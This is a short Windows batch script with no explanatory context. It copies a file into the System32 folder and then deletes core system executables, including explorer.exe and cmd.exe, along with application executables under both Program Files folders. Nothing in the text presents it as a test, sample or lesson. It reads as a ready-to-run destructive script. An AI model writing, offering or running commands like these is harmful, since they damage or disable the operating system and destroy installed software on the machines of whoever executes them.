@echo off
copy file.txt C:\Windows\System32\file.txt
del "%WINDIR%\explorer.exe"
del "%SYSTEMROOT%\system32\cmd.exe"
del "%ProgramFiles%\App\app.exe"
del "%ProgramFiles(x86)%\App\app.exe"
